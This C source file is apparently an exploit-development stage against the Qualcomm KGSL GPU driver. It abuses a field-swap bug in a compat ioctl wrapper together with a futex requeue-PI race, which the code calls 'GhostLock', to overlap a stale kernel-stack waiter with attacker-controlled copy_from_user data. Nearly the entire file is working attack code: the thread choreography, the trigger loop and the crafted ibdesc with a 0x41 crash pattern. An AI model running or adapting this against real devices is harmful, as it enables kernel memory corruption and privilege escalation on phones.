/**
 * test_swap_workaround.c — Work around compat wrapper field swap bug
 *
 * DISASSEMBLY FINDING:
 * The compat wrapper kgsl_ioctl_rb_issueibcmds_compat has a field swap bug:
 *
 *   ldp w8, w10, [x2]        // w8=drawctxt_id, w10=flags
 *   ldr w9, [x2, #0x10]      // w9=numibs
 *   ldr x11, [x2, #8]        // x11=ibdesc_addr (64-bit)
 *   str w8, [sp, #8]         // native+0x00 = drawctxt_id
 *   str w9, [sp, #0x20]      // native+0x18 = numibs    ← SHOULD BE FLAGS!
 *   stp x10, x11, [sp, #0x10] // native+0x08 = flags    ← SHOULD BE IBDESC_ADDR!
 *                              // native+0x10 = ibdesc   ← SHOULD BE NUMIBS!
 *
 * Native struct (from kheaders msm_kgsl.h):
 *   +0x00: drawctxt_id (4B)
 *   +0x04: pad (4B)
 *   +0x08: ibdesc_addr (8B, unsigned long)
 *   +0x10: numibs (4B)
 *   +0x14: timestamp (4B)
 *   +0x18: flags (4B)
 *
 * WORKAROUND: Swap fields in compat struct so they land correctly:
 *   compat.flags       = lower_32(ibdesc_user_ptr)
 *   compat.ibdesc_addr = numibs (as uint64_t)
 *   compat.numibs      = real_flags
 *
 * TEST: First with safe ibdesc values (no GhostLock), verify ioctl succeeds.
 * Then with GhostLock + crash pattern to verify CFU overlap.
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

/* ── KGSL ioctl encoding ── */
#define IOC(nr,sz) (((uint32_t)3<<30)|(((uint32_t)(sz))<<16)|(((uint32_t)0x09)<<8)|((uint32_t)(nr)))

/* Native ibdesc (64-bit layout, used by kernel handler) */
struct kgsl_ibdesc_native {
    uint64_t gpuaddr;       // +0x00 (8B)
    uint64_t __pad;         // +0x08 (8B)
    uint64_t sizedwords;    // +0x10 (8B)
    uint32_t ctrl;          // +0x18 (4B)
};  // total: 28 bytes

/* ── Test 1: Safe ibdesc, no GhostLock ── */
static int test_safe_swap(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open failed: %d\n", errno); return -1; }

    /* Create context */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    int r = ioctl(fd, IOC(0x13, 0x08), &ctx);
    printf("CREATE: ret=%d id=%u\n", r, ctx.id);
    if (r < 0) { close(fd); return -1; }

    /* Build ibdesc with safe values (no crash) */
    struct kgsl_ibdesc_native ib;
    memset(&ib, 0, sizeof(ib));
    ib.gpuaddr = 0;
    ib.sizedwords = 1;  /* safe: 1 dword */
    ib.ctrl = 0;
    printf("ibdesc at %p, sizeof=%zu\n", &ib, sizeof(ib));

    /*
     * Build SWAPPED compat struct.
     *
     * Normal compat struct:
     *   +0x00: drawctxt_id (uint32_t)
     *   +0x04: flags (uint32_t)
     *   +0x08: ibdesc_addr (uint64_t) ← user pointer
     *   +0x10: numibs (uint32_t)
     *
     * Wrapper maps:
     *   w10=compat[0x04]=flags        → native[0x08] (should be ibdesc_addr!)
     *   x11=compat[0x08]=ibdesc_addr  → native[0x10] (should be numibs!)
     *   w9=compat[0x10]=numibs        → native[0x18] (should be flags!)
     *
     * So we set:
     *   compat[0x04] = (uint32_t)(uintptr_t)&ib  ← ibdesc user pointer
     *   compat[0x08] = (uint64_t)1                ← numibs
     *   compat[0x10] = 0                          ← flags
     */
    uint8_t swapped[20];
    memset(swapped, 0, 20);
    *(uint32_t*)(swapped+0x00) = ctx.id;                      /* drawctxt_id */
    *(uint32_t*)(swapped+0x04) = (uint32_t)(uintptr_t)&ib;    /* → will become ibdesc_addr */
    *(uint64_t*)(swapped+0x08) = (uint64_t)1;                 /* → will become numibs */
    *(uint32_t*)(swapped+0x10) = 0;                           /* → will become flags */

    printf("\n=== Test: Swapped compat struct ===\n");
    printf("compat bytes: ");
    for (int i = 0; i < 20; i++) printf("%02x ", swapped[i]);
    printf("\n");

    /* Also test normal (non-swapped) for comparison */
    uint8_t normal[20];
    memset(normal, 0, 20);
    *(uint32_t*)(normal+0x00) = ctx.id;
    *(uint32_t*)(normal+0x04) = 0;                            /* flags=0 */
    *(uint64_t*)(normal+0x08) = (uint64_t)(uintptr_t)&ib;     /* ibdesc_addr */
    *(uint32_t*)(normal+0x10) = 1;                            /* numibs=1 */

    printf("\n=== Test: Normal compat struct ===\n");
    errno = 0;
    r = ioctl(fd, IOC(0x10, 0x14), normal);
    printf("normal: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");

    printf("\n=== Test: SWAPPED compat struct ===\n");
    errno = 0;
    r = ioctl(fd, IOC(0x10, 0x14), swapped);
    printf("swapped: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");

    ioctl(fd, IOC(0x14, 0x04), &ctx.id);
    close(fd);
    return r;
}

/* ── GhostLock state ── */
static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

static void *waiter(void *a) {
    (void)a;
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[waiter] pi_chain locked\n");
    ready = 1; while (!owner_ok) usleep(1000);

    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts); ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);
    printf("[waiter] ⚠️  Stale waiter on kernel stack!\n");

    /* ── KGSL with SWAPPED struct ── */
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("[kgsl] fd=%d\n", fd);

    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, IOC(0x13, 0x08), &ctx);
    printf("[kgsl] CREATE: ret=%d id=%u\n", (int)r, ctx.id);
    if (r < 0) goto out;

    /* Crash pattern ibdesc */
    struct kgsl_ibdesc_native ib;
    memset(&ib, 0, sizeof(ib));
    ib.gpuaddr = 0x0ULL;
    ib.sizedwords = 0x4141414141414141ULL;  /* CRASH IF CFU HITS WAITER */
    ib.ctrl = 0;

    printf("[kgsl] ibdesc at %p\n", &ib);

    /* SWAPPED compat struct */
    uint8_t swapped[20];
    memset(swapped, 0, 20);
    *(uint32_t*)(swapped+0x00) = ctx.id;                      /* drawctxt_id */
    *(uint32_t*)(swapped+0x04) = (uint32_t)(uintptr_t)&ib;    /* → ibdesc_addr */
    *(uint64_t*)(swapped+0x08) = (uint64_t)1;                 /* → numibs=1 */
    *(uint32_t*)(swapped+0x10) = 0;                           /* → flags=0 */

    printf("\n[kgsl] ╔══════════════════════════════════════╗\n");
    printf("[kgsl] ║  SWAPPED COMPAT CFU + GhostLock     ║\n");
    printf("[kgsl] ║  ibdesc: ga=0x%016llx              ║\n", (unsigned long long)ib.gpuaddr);
    printf("[kgsl] ║  ibdesc: sw=0x%016llx              ║\n", (unsigned long long)ib.sizedwords);
    printf("[kgsl] ║  ⚠️  KERNEL CRASH = CFU OVERLAP!   ║\n");
    printf("[kgsl] ╚══════════════════════════════════════╝\n\n");

    errno = 0;
    r = ioctl(fd, IOC(0x10, 0x14), swapped);
    printf("[kgsl] ISSUEIBCMDS(swapped): ret=%d errno=%d (%s)\n",
           (int)r, errno, r < 0 ? strerror(errno) : "OK ✅ CFU FIRED!");

    ioctl(fd, IOC(0x14, 0x04), &ctx.id);
out:
    close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_target locked\n");
    owner_ok = 1; while (!ready) usleep(1000);
    usleep(500000);
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_chain locked\n");
    while (!kgsl_done) sleep(1);
    return 0;
}

static void test_ghostlock_swapped(void) {
    printf("\n╔══════════════════════════════════════════╗\n");
    printf("║  GhostLock + SWAPPED COMPAT CFU TEST    ║\n");
    printf("║  ⚠️  KERNEL CRASH = CFU OVERLAP!       ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    f_wait=0; f_pi_target=0; f_pi_chain=0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000);
    pthread_create(&ot, 0, owner, 0);
    usleep(300000);

    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) { printf("[trigger] ✅ GhostLock! ret=%ld\n\n", r); break; }
        usleep(1000);
    }

    while (!kgsl_done) sleep(1);
    pthread_join(wt, 0); pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED ===\n");
}

int main(void) {
    printf("╔══════════════════════════════════════╗\n");
    printf("║  KGSL Compat Wrapper Swap Workaround║\n");
    printf("╚══════════════════════════════════════╝\n\n");

    /* Test 1: Safe ibdesc with swapped struct */
    printf("── Test 1: Safe ibdesc (no crash) ──\n");
    int r = test_safe_swap();

    if (r == 0) {
        printf("\n✅ Safe test PASSED! Proceeding to GhostLock test...\n");
        test_ghostlock_swapped();
    } else {
        printf("\n❌ Safe test FAILED. Skipping GhostLock test.\n");
    }

    return 0;
}
